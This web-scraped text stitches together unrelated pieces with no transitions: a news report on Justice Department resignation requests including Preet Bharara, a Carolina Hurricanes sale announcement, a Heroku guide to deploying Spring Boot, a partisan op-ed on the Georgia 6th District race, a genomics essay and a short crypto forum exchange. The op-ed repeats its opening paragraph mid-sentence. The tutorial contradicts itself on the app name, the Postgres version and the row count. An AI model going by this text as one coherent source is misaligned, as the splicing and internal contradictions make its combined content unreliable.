A Justice Department spokeswoman confirmed the resignation requests included Bharara, whose office handles some of the most critical business and criminal cases passing through the federal judicial system.
Bharara met with Trump in Trump Tower on Nov. 30. After, Bharara told reporters the two had a “good meeting” and he had agreed to stay on.
On Friday, Bharara was unsure where he stood because he did not know if the person who contacted him about resigning was aware that Trump had asked him to remain in office, according to a source familiar with the matter.
It was not immediately clear if all resignations would ultimately be accepted.
A Justice Department spokesman said on Friday Trump had called Dana Boente, acting U.S. deputy attorney general, to decline his resignation.
Trump also called Maryland U.S. Attorney Rod Rosenstein, his pick to take over as deputy attorney general, to keep him in his post, the spokesman said.
CORRUPTION CRUSADER
Bharara, appointed by Democratic President Barack Obama in 2009, has pursued an aggressive push against corruption in state and city politics and is known for his prosecution of white-collar criminal cases. He also has been overseeing a federal probe into New York City Mayor Bill de Blasio's fundraising.
In November, he announced charges against two defendants in connection with what he called a multimillion-dollar fraud and kickback scheme at Valeant Pharmaceuticals International Inc VRX.TO.
He has also brought dozens of successful cases against insider traders, including a $1.8 billion settlement and plea deal in 2013 with hedge fund SAC Capital Advisors LP.
His office has secured settlements with companies including General Motors Co (GM.N) and JPMorgan Chase & Co (JPM.N); won several convictions and guilty pleas of former employees of Ponzi scheme operator Bernard Madoff; and prosecuted Suleiman Abu Ghaith, a son-in-law of the late al Qaeda leader Osama bin Laden.
Bharara's priorities have often matched those set by Obama's Justice Department, which potentially puts him at odds with the Trump administration.
Amid an increase in civil rights investigations nationally, for example, Bharara's office joined a lawsuit that led to a settlement in 2015 aimed at reducing violence in New York City's Rikers Island jail complex.
U.S. Senator Chuck Schumer, a Democrat, said in a statement that he was “troubled” to learn of the requests for resignations, “particularly that of Preet Bharara.”

As Schumer's chief counsel, Bharara helped lead the investigation of the dismissals of U.S. attorneys in 2006 during the George W. Bush administration.
Robert Capers, U.S. Attorney in Brooklyn, issued a statement saying he had been asked to resign. He said Bridget Rohde, the chief assistant U.S. attorney in that office, would take over his role in an acting capacity.
The Justice Department said on Friday: “Until the new U.S. attorneys are confirmed, the dedicated career prosecutors in our U.S. attorney's offices will continue the great work of the department in investigating, prosecuting, and deterring the most violent offenders.”
RALEIGH, NC - Don Waddell, President of Gale Force Sports & Entertainment, today announced that Dallas entrepreneur and philanthropist Tom Dundon has signed an agreement to purchase a majority stake in the National Hockey League's Carolina Hurricanes. Pending league approval and the finalization of the sale, Dundon will take control of all team operations.
"I am thrilled to continue to build upon what Peter Karmanos started in Raleigh," said Dundon. "The Hurricanes are a team on the rise, and I believe we have an opportunity to take the franchise to the next level. I'm ready to get to work."
Dundon is the Chairman and Managing Partner of Dundon Capital Partners, a Dallas-based private investment firm. His investment activities have spanned the entertainment, healthcare, real estate and hospitality, technology, automotive and financial services sectors.

Deploying Spring Boot Applications to Heroku
The Spring Boot model of deploying standalone applications is a great fit for Heroku. You can use either Maven or Gradle to deploy a Spring application on Heroku, but for this guide we'll assume that you're using Maven and have Maven 3 installed on your machine.
To begin, create a free Heroku account. Then download and install the Heroku CLI.
Download the Heroku CLI
Once installed, you can use the heroku command from the terminal to log in using the email address and password you used when creating your Heroku account:
$ heroku login heroku: Press any key to open up the browser to login or q to exit › Warning: If browser does not open, visit › https://cli-auth.heroku.com/auth/browser/*** heroku: Waiting for login... Logging in... done Logged in as me@example.com
To check that your key was added, run heroku keys . If your key isn't there, you can add it manually by running heroku keys:add . For more information about SSH keys, see Managing Your SSH Keys.
Creating a Spring Boot app
To create a new Spring Boot application, first install the Spring Boot CLI as described in the Spring Boot documentation. This will add a spring command to your path.
You can also start with a working sample app if you'd prefer.
Use the CLI to create a new application by running this command:
$ spring init --dependencies=web demo
Then move into the application directory:
$ cd demo
The application does not have any custom logic by default – it's just an empty template. To add some behavior, open the src/main/java/com/example/demo/DemoApplication.java file and put the following code in it:
In file src/main/java/com/example/demo/DemoApplication.java write:
package com.example.demo; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.web.bind.annotation.*; import org.springframework.stereotype.*; @Controller @SpringBootApplication public class DemoApplication { @RequestMapping("/") @ResponseBody String home() { return "Hello World!"; } public static void main(String[] args) { SpringApplication.run(DemoApplication.class, args); } }
This creates a simple request mapping that displayed “Hello World!” in the browser. You could run the application locally to confirm this, but we'll jump straight to running it on Heroku.
Preparing a Spring Boot app for Heroku
Before you can deploy the app to Heroku, you'll need to create a Git repository for the application and add all of the code to it by running these commands:
$ git init $ git add . $ git commit -m "first commit"
You'll deploy the app by pushing this Git repo to Heroku. It's also possible to deploy using the Heroku Maven plugin, but this guide will focus on using Git and the Heroku CLI.
In order to deploy to Heroku, you'll first need to provision a new Heroku app. Run this command:
$ heroku create Creating app... done, safe-woodland-66362 https://safe-woodland-66362.herokuapp.com/ | https://git.heroku.com/safe-woodland-66362.git
This also creates a remote repository called heroku in your local git repo. Heroku generates a random name (in this case nameless-lake-8055 ) for your app. You can rename it later with the heroku apps:rename command.
Now deploy your code:
$ git push heroku master remote: Compressing source files... done. remote: Building source: remote: remote: -----> Java app detected remote: -----> Installing JDK 1.8... done remote: -----> Executing: ./mvnw -DskipTests clean dependency:list install ... remote: [INFO] BUILD SUCCESS remote: [INFO] ------------------------------------------------------------------------ remote: [INFO] Total time: 15.173 s remote: [INFO] Finished at: 2019-02-06T02:20:42Z remote: [INFO] ------------------------------------------------------------------------ remote: -----> Discovering process types remote: Procfile declares types -> (none) remote: Default types for buildpack -> web remote: remote: -----> Compressing... remote: Done: 64.8M remote: -----> Launching... remote: Released v3 remote: https://safe-woodland-66362.herokuapp.com/ deployed to Heroku remote: remote: Verifying deploy... done. To https://git.heroku.com/safe-woodland-66362.git * [new branch] master -> master
Heroku automatically detects the application as a Maven/Java app due to the presence of a pom.xml file. It installed Java 8 by default, but you can easily configure this with a system.properties file as described in the Specifying a Java version Dev Center article. It will run your app using the default command.
All that said, the application is now deployed. You can visit the app's URL by running this command:
$ heroku open
You'll see the “Hello World!” text in the browser.
You can view the logs for the application by running this command:

Connecting to a database
You can attach a PostgreSQL database to your app by running the following command from the CLI:
$ heroku addons:create heroku-postgresql
If you prefer to use MySQL or another database vendor, check out Add-ons Marketplace to see what is available.
Now you can list the configuration variables for your app to display the URL needed to connect to the database, DATABASE_URL:
$ heroku config === safe-woodland-66362 Config Vars DATABASE_URL: postgres://evxybkkmiodzdd:857fa7799badf797bc9ae444b67dab94d2490e4a25d5a2d112019fbc75b8c42e@ec2-54-225-237-84.compute-1.amazonaws.com:5432/d3ftstv7m1o4k2
Heroku also provides a pg command that shows a lot more:
$ heroku pg === DATABASE_URL Plan: Hobby-dev Status: Available Connections: 0/20 PG Version: 10.6 Created: 2019-02-06 02:21 UTC Data Size: 7.6 MB Tables: 0 Rows: 0/10000 (In compliance) Fork/Follow: Unsupported Rollback: Unsupported Continuous Protection: Off Add-on: postgresql-clean-86646
This indicates a hobby database (free) is running Postgres 9.3.3, with a single row of data.
Once the database add-on has been created, Heroku will automatically populate the environment variables SPRING_DATASOURCE_URL , SPRING_DATASOURCE_USERNAME , and SPRING_DATASOURCE_PASSWORD . These environment variables should allow your Spring Boot application to connect to the database without any other configuration as long as you add a PostgreSQL JDBC driver to your dependencies like so:
In file pom.xml , on line 26 add:
<dependency> <groupId>org.springframework.boot</groupId> <artifactId>spring-boot-starter-jdbc</artifactId> </dependency> <dependency> <groupId>org.postgresql</groupId> <artifactId>postgresql</artifactId> </dependency>
You can customize your application's database configuration in your application.properties .
In file src/main/resources/application.properties write:
spring.datasource.driverClassName=org.postgresql.Driver spring.datasource.maxActive=10 spring.datasource.maxIdle=5 spring.datasource.minIdle=2 spring.datasource.initialSize=5 spring.datasource.removeAbandoned=true
Then you can then add a configuration bean to your app.
In file src/main/java/demo/DatabaseConfig.java write:
package com.example.demo; import com.zaxxer.hikari.*; import org.springframework.beans.factory.annotation.Value; import org.springframework.context.annotation.*; import javax.sql.DataSource; @Configuration public class DatabaseConfig { @Value("${spring.datasource.url}") private String dbUrl; @Bean public DataSource dataSource() { HikariConfig config = new HikariConfig(); config.setJdbcUrl(dbUrl); return new HikariDataSource(config); } }
For more information, see Connecting to Relational Databases on Heroku with Java.
Now your application should be able to connect to the database. You can follow our guide on Running Database Migrations for Java Apps to initialize the database. The sample app uses Liquibase.
Customizing the boot command
You can override the default command used to run your app or define custom process types using a Procfile . The correct command depends on what you need to do with your app. Common process types are used to run a web process or run database migrations.
Next steps
For more complete examples of Spring Boot apps that run on Heroku see:
Heroku provides a wide range of features for Spring applications. You can provision add-ons that introduce third-party cloud services like persistence, logging, monitoring and more. The add-on marketplace has a large number of data stores, from Redis and MongoDB providers, to Postgres and MySQL.

Karen Handel waves to supporters. (Branden Camp/European Pressphoto Agency)
The buzz in Washington surrounding the race for Georgia's 6th Congressional District was all bad for the last couple of weeks. People had been bad-mouthing the Republican candidate, Karen Handel, they had been insulting the Republican National Committee's competence and they had been dismissing any notion that Republicans could pull through to defeat the energized “resistance.” But the ashen, sour and dejected faces on CNN Tuesday night following Democratic candidate Jon Ossoff's defeat made the last 10 days of Republicans' worry and anxiety worthwhile. By any measure, the The buzz in Washington surrounding the race for Georgia's 6th Congressional District was all bad for the last couple of weeks. People had been bad-mouthing the Republican candidate, Karen Handel, they had been insulting the Republican National Committee's competence and they had been dismissing any notion that Republicans could pull through to defeat the energized “resistance.” But the ashen, sour and dejected faces on CNN Tuesday night following Democratic candidate Jon Ossoff's defeat made the last 10 days of Republicans' worry and anxiety worthwhile. By any measure, the victory proves the Republican political machine is alive and working well.
Heading into Tuesday, Democrats were prepared to bask in their self-righteous glory and proclaim an outright victory in the wake of President Trump's political decline. They wanted to claim a successful referendum on the Trump administration and the president's “America First” policies. But with Handel comfortably pulling through to claim her seat, Democrats are left with nothing to show for their tens of millions of dollars and full-court press.
If anything, this race proves Republicans have no reason to be defensive as a result of Obamacare's demise, it shows Republicans have nothing to hide from in the age of Trump and it signifies that nothing about the current faux-scandal-ridden environment has produced a downdraft for Republicans.

Democrats thought they were going to walk away from Tuesday's race victorious, but they have yet to produce a viable person-to-person message for their candidates to work with. They still don't have an economic message for voters who want something more than the liberal call for more welfare, and they have no legitimate response to the national call for a shift away from the status quo.
The left poured tens of millions of dollars into this race, making it the most expensive House race in history. But many of those contributions came from outside groups, Hollywood elites and liberal benefactors who have never once visited Georgia's 6th. And perhaps that reality is fitting. After all, Ossoff did not reside in the district he ran to represent and he epitomized the synthetic, millennial Democrat who, despite loud campaigning, really does not have much to say.
For her part, Handel did a good job holding her own in a race that could be best described as having spiraled out of control. She was focused, argued for Republican policies and maintained a level head despite the unprecedented onslaught of attacks from liberal groups. Democrats' attempts to conflate Handel with Trump failed to make a difference in Tuesday's election.
The RNC also deserves a great deal of credit following the victory. It targeted Republican voters, got out the vote and made clear that Republicans are just as strong today as when Trump defeated Hillary Clinton in November last year.
Democratic pundits will try to distract from the devastating loss they experienced Tuesday, but there is no hiding the fact that the race for Georgia's 6th failed to show much backlash against Trump among the affluent suburbanites who liberals too often assume are moving their way. Tuesday was a yuge win for Trump. They may not admit it to pollsters, but a lot of people are pulling for the president. And they are pulling for Republicans.
Following their devastating defeat in Georgia, Democrats must ask themselves whether House Minority Leader Nancy Pelosi (D-Calif.) has a place in their leadership. Clinton is gone and Pelosi should step aside to make room for someone younger. But it won't be Jon Ossoff.
In one fell swoop, the world of genomics got a massive present: 45 new, fully sequenced bird genomes. This bonanza came in 2014 out of a four-year mega-sequencing project involving hundreds of researchers from more than 80 institutions across 20 countries. It represents just one tip of the huge tree of life.
The project was led by China's BGI, the world's largest genomics center. BGI has also led the sequencing of panda, rice and 38 different types of pigeon, which Darwin used as prime evidence for evolution in his 1859 masterpiece, "On the Origin of Species."
One of BGI's biggest findings was support for the "big bang" concept of bird evolution. The family tree built from these genomes shows that most bird lineages burst forth in a relatively short period of time (10-15 million years) after dinosaurs vanished from the Earth. Birds are "dinosaurs with wings," after all -- just look at a scaly foot of a chicken.
BGI's Avian Phylogenomics Project was huge: analysis of the data took more than 300 years of CPU (central processing units) time on several supercomputers. Yet it was just one small slice of global efforts to decode the DNA of life on Earth. Birds, some of our favorite vertebrate species -- there are more than 40 million birdwatchers in the U.S. alone, are just a tiny twig of the four-billion-year-old tree of life.
Graphic shows higher-order animals that have had or in the process of having, their genomes sequenced.
Genome 10K, for example, aims to sequence a representative genome from every animal type with a spine. It will take 10,000 genomes just to sample each highly related grouping of species, or "genus." G10K has inspired the Insect 5K and GIGA projects, which are mass-sequencing terrestrial insects and marine invertebrates. These are just three of the many mega-sequencing projects underway around the world.
President Obama recently announced the one million genomes project, built in part on the existing Million Veteran Programs. Craig Venter is working on his first "million-ome." Jong Bhak, a leader of the Korean Personal Genome Project, has outlined a vision for a Billion Genomes Project. Harvard visionary George Church, founder of the Personal Genome Project, is calling for sequencing everyone.
We are sequencing the world -- from ourselves to all of the organisms upon which we depend as a living planet. We are decoding the planetary genome. What does this mean for the future? What are the risks and benefits?
In the future, our planetary genome might also include new life forms built in the lab. There is even talk of the possibility of a resurrected Neanderthal, carried by a surrogate human mother.
DNA is the foundational layer of life. It is the genetic material found in our cells. Each genome -- the complete set of the genes for any organism -- is the recipe that creates life.
DNA is exceedingly simple. Think of it like a language, but with only four letters -- A, C, G, T. The complex ways in which these letters can be combined gives rise to life. These four letters build words, sentences, paragraphs, chapters and books -- one for each living organism on Earth. It is a living code -- the "biocode."
Each genome is an autobiography. The letters and words explain traits like eye, hair and skin color, genetic health problems and myriad other traits. DNA can be a crystal ball -- like when it tells us whether a newborn has a genetic disease or not -- and it holds clues to our past. Our DNA is the DNA of our distant ancestors. In fact, we are almost 99 percent chimpanzee, human beings' nearest relative. If you look back through the four billion years of life, you'll find that 37 percent of our genes come from single-celled bacterial ancestors.
Nicole Barna, a senior operations coordinator at the Whitehead Institute in Cambridge, Mass., holds a tray of human DNA that is undergoing the sequencing process at the institute May 31, 2001.
Being able to read out our DNA opens the doors to a range of possibilities, but it also brings talk of privacy breaches, genetic discrimination, eugenics, designer babies, de-extinction and new life forms. It is already possible to recreate deadly viruses from the digital copies of their genomes. World leaders ranked synthetic biology threats as one of the top risks facing the world at the 2015 Davos summit.
DNA research is a field where what once seemed like science fiction is becoming reality. Heather Dewey-Hagborg, an artist, started picking up genetic trash on the streets of New York and using the analysis of a few genes, like those for eye color and gender, created faces she then 3D printed. Companies have sprung up to offer 3D mug shot services to police. Comb your hair in public and you could be leaving behind a DNA hologram of yourself.
This raises deep questions about the possibility of widespread genetic surveillance. To counter it, Dewey-Hagborg created a spray that cleans surfaces you touch and spreads fake DNA to keep your identity secret. While still art, her work cuts close to the bone.
We are building the capacity to sequence life on Earth at the same time that we are losing biological diversity.
We are also facing one of the biggest changes in the distribution and richness of global biodiversity this planet has ever seen. We are entering the sixth mass extinction. We are building the capacity to sequence life on Earth right at the same time that we are losing biological diversity. Because of over-consumption, habitat destruction, pollution and climate change, by the end of this century, the Earth will boast a severely impoverished planetary genome compared to the one during Darwin's time.
But it might also include new life forms built in the lab. There is even talk of the possibility of a resurrected Neanderthal, carried by a surrogate human mother. Science fiction? Not anymore.
Will you or your loved ones have your DNA read? DNA testing escaped the lab long ago. Curbside genetic testing is possible in major cities -- the "Who's Your Daddy" truck is destined to be the focus of a reality show. Ancestry checks and full genome sequencing are now available. For all kinds of animals, too -- cats, dogs, even yaks. The practical genomics revolution looms.
This raises deep questions about the possibility of widespread genetic surveillance.
Science is now working towards a $100 genome, and it might result in the accumulation of billions of genomes in the next decade. We can sequence more genomes than there are people on Earth. Why would we do that? Because many of us will need cancer genomes sequenced for diagnosis and to decide upon the best therapy.
Perhaps the most explosive findings are coming from the studies of microbes that live in and on us -- the human microbiome. Microbes are the invisible majority of life on Earth, and genomics is revealing their workings in keeping us and the planet healthy.
All of this data is coming together to give us a new vision of the planetary genome. We are biocoding the Earth.

Please don't hate me, but I'm kinda starting to like the idea that when/if KMD ends up getting listed on Poloniex there will be 17 less BTC pairs... although 16 (i.e. UNITY not getting delisted) would have been a much better deal.

I thought KMD wasn't getting listed on polo because it paid dividends and polo for legal reasons don't allow such coins on there?
I may be wrong -- and i hope i am -- because exposure polo would give kmd would be a massive, massive loss.
